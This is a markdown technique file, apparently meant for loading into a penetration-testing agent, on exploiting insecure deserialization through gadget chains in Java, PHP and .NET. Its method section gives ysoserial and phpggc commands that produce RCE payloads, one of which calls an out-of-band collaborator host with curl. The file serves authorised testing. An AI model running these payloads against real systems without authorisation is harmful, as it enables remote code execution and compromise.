---
name: web-deserialization
description: >
  Insecure deserialization → RCE via gadget chains. Load when the app deserializes attacker data:
  Java (rO0/AC ED base64), PHP `unserialize` (O:), Python pickle, .NET BinaryFormatter/ViewState,
  Ruby Marshal/YAML. Signals: serialized blobs in cookies/params, `__VIEWSTATE`, `rO0AB`, `O:8:`.
domain: web
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: critical
owasp: [A08:2021-Software-and-Data-Integrity-Failures]
cwe: [CWE-502]
tools: [ysoserial, phpggc, burp]
schema_version: 1
---

# Insecure deserialization

## When it applies
The app takes serialized objects from the client (cookies, hidden fields, params, message
queues) and deserializes them. Recognizable by format markers.

## Why it works
Deserialization reconstructs objects and can invoke their methods (magic methods, readObject,
`__wakeup`). A crafted object graph ("gadget chain") strings together existing library methods
to reach a dangerous sink — command execution — during/after deserialization.

## Method
> **Payloads & full variation set:** [`cheatsheet.md`](cheatsheet.md) next to this file — work the set, not the first line.
1. **Spot the blob & format**: Java `rO0AB`/`AC ED 00 05`, PHP `O:8:"...":`, .NET
   `__VIEWSTATE`/`AAEAAAD`, Python pickle, Ruby Marshal `\x04\x08`.
2. **Confirm it's deserialized untrusted**: tamper a byte → parse error/behaviour change.
3. **Generate a gadget chain** with the right tool for a library on the classpath:
   - Java: `ysoserial CommonsCollections1 'curl <collab>' | base64`
   - PHP: `phpggc Monolog/RCE1 system id` (pick a gadget matching a loaded framework)
   - .NET: `ysoserial.net` (ViewState needs the MAC key or MAC-disabled).
4. **Deliver** in the sink; start with an OOB command (`curl`/`nslookup` to your host) as safe proof.

## Gotchas
- The chain must match a library actually present (Commons-Collections version, Monolog, etc.) — enumerate dependencies.
- Java: prefer a DNS/OOB gadget to confirm before an RCE payload.
- .NET ViewState needs the machineKey unless MAC validation is off — check for leaked web.config.

## Verify success
An OOB callback or command output proving code executed during deserialization.

## References
ysoserial / phpggc / ysoserial.net; PortSwigger deserialization labs; OWASP.
